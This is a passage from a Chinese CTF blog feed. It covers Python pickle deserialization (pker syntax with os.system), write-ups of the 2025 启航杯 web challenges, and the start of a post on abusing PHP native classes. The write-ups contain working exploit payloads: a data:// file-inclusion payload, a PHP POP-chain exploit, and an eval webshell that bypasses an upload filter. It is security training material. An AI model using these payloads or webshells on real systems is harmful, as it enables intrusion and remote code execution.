class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)</span></span>, <span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>多参数调用函数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">INST</span><span class="hljs-params">(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>[, par0,par1...])</span></span><br><span class="hljs-function"><span class="hljs-title">OBJ</span><span class="hljs-params">(GLOBAL(<span class="hljs-string">&#x27;[module]&#x27;</span>, <span class="hljs-string">&#x27;[callable]&#x27;</span>)</span></span><span class="hljs-selector-attr">[, par0,par1...]</span>)<br></code></pre></td></tr></table></figure><h4 id="pker：实例化对象"><a href="#pker：实例化对象" class="headerlink" title="pker：实例化对象"></a>pker：实例化对象</h4><ul><li>实例化对象是一种特殊的函数执行</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br><br><br><span class="hljs-meta"># 或者</span><br><br>animal = OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>), <span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><ul><li>其中，python原文件中包含：</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, name, category</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.category = category<br></code></pre></td></tr></table></figure><ul><li>也可以先实例化再赋值：</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">animal = INST(<span class="hljs-string">&#x27;__main__&#x27;</span>, <span class="hljs-string">&#x27;Animal&#x27;</span>)<br>animal.name=<span class="hljs-string">&#x27;1&#x27;</span><br>animal.category=<span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">return</span> animal<br></code></pre></td></tr></table></figure><h4 id="手动辅助"><a href="#手动辅助" class="headerlink" title="手动辅助"></a>手动辅助</h4><ul><li>拼接opcode：将第一个pickle流结尾表示结束的<code>.</code>去掉，两者拼接起来即可。</li><li>建立普通的类时，可以先pickle.dumps，再拼接至payload。</li></ul><p>参考：</p><p><a href="https://xz.aliyun.com/news/7032">https://xz.aliyun.com/news/7032</a> 先知大佬</p><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> 官方文档</p><p><a href="https://tttang.com/archive/1294/">https://tttang.com/archive/1294/</a> P神</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pickle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>启航杯</title>
    <link href="/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/"/>
    <url>/tuyi/2025/01/25/%E5%90%AF%E8%88%AA%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="启航杯2025-1-25"><a href="#启航杯2025-1-25" class="headerlink" title="启航杯2025.1.25"></a>启航杯2025.1.25</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>也是第一次正式比赛akweb啊  呜呜呜 虽然多不难</p><h3 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$file</span>))<br>    &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;no no no ~ &quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简单的文件包含</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">file</span>=data://text/plain<span class="hljs-comment">;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></code></pre></td></tr></table></figure><p>伪协议加编码绕过</p><h3 id="Web-pop"><a href="#Web-pop" class="headerlink" title="Web_pop"></a>Web_pop</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to QHCTF 2025, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>简单的pop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="PCREMagic"><a href="#PCREMagic" class="headerlink" title="PCREMagic"></a>PCREMagic</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?php.*?eval.*?\(.*?\).*?\?&gt;/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$user_dir</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">random_int</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>文件上传，但是过滤用的是非贪婪过滤</p><p>直接绕过就行</p><p>webshell:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>写个表单上传</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://challenge.qihangcup.cn:33406/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>蚁剑直接连接就行</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h3><p>gpt直接搜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_OAEP<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_message</span>(<span class="hljs-params">encrypted_message_b64, private_key</span>):<br>    <span class="hljs-comment"># Base64解码加密消息</span><br>    encrypted_message = base64.b64decode(encrypted_message_b64)<br>    <span class="hljs-comment"># 导入私钥</span><br>    key = RSA.import_key(private_key)<br>    <span class="hljs-comment"># 创建解密器</span><br>    cipher = PKCS1_OAEP.new(key)<br>    <span class="hljs-comment"># 解密并返回结果</span><br>    <span class="hljs-keyword">return</span> cipher.decrypt(encrypted_message).decode()<br><br><span class="hljs-comment"># 第二个私钥（实际能解密的私钥）</span><br>private_key = <span class="hljs-string">b&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="hljs-string">MIICXQIBAAKBgQCvNhcDwDMhZl3dJt0+gkvu/cQuRFM58aqCDRLfS5bnCMPFXFi8</span><br><span class="hljs-string">aHrYZNC7Tz/DrenOSUCv+d+4sZqjRW8GsbOR8DWK7wNO3SliQ8MmiY2jfF5omPaU</span><br><span class="hljs-string">5OJiGUuAYLbYeIUkvEn6Zf10hmwuaGwku5qgEEPppfaUtleFsOFjdYMbnQIDAQAB</span><br><span class="hljs-string">AoGACZwbXgrMIyBUtJz9lICb/pMvj+QSdoKhOfnSl6mzMJ/D8Q60FT1bw4OgCS37</span><br><span class="hljs-string">DtX6lWRiJmS7lwsyspLL2J+lfBuq2PrES/SRcp4TausDemtRfQVbKmBEcfy0oIn3</span><br><span class="hljs-string">DM7dT4EAhUSI2Z4Y6nX+3yztwQV0ReeYdlg2P8eOprftvVcCQQC3kpHbwv9kHa5N</span><br><span class="hljs-string">z49QFV5W1XHCD4KE3wC1xm/9dWbOMrGkR2v7CIXYoRcD6hg4kv5JzKPOaYYpygqZ</span><br><span class="hljs-string">qRR/uWfPAkEA9FcBpiiB1b7Ozxk7Gz6NF94MQItJ0xTrArArllBheAhIjaDAjX1z</span><br><span class="hljs-string">OQ++RGZVByXVLmPyWJNK93uR0tqQOju00wJACjRIjVnCjpMjzEl8Yuw9KUCGKU5p</span><br><span class="hljs-string">Z+9pf7E/KmyrQU0KGOKrevHXVtpliB8sJ4DsR7frZx7wiUQk4LPIYu0wewJBAIQo</span><br><span class="hljs-string">64NsNY3ffw0VoJrD4p0eRZJDxNKfZd42W90Z7R53nIa+hGgDiuc6VLe6ghMzq3NE</span><br><span class="hljs-string">LDksskfaVq2t+oUE9nECQQCptxk0oH5dwDttlWa0esz9V+HdMY4tQlvUuHUwCY9D</span><br><span class="hljs-string">slrK1kk630BceGayC2TYOvfdco7iui5HYIJ4W5ff3RRB</span><br><span class="hljs-string">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># 第二个加密消息（实际能解密的消息）</span><br>encrypted_msg = <span class="hljs-string">&quot;UpyynVxi3qhqCLRI+lsKnLZ4QrXmUCnmh8fRUR4yHbl49I2CnlwBmKtbOKKcXQCKBMrZ2sedeh7UiVBth5peL0IarRC/GHevnZOF2Bw48E5g5DAzzMsotqnDV0NZpKMuqyXtSeqm9I/gMUKzbPzBtwmmGQ66vCjswrdXghcmUc4=&quot;</span><br><br><span class="hljs-comment"># 解密并输出</span><br>decrypted = decrypt_message(encrypted_msg, private_key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密结果:&quot;</span>, decrypted)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
      <tag>文件包含</tag>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP原生类</title>
    <link href="/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍php常用的原生类</p><p>在php中只要函数名和参数可控，那么使用php原生类会有很大作用</p><blockquote><p>前提：<code>php.ini</code> 中通过 <code>disable_classes</code> 限制</p></blockquote><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>与DirectoryIterator相比具有更好的性能，用法其实是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 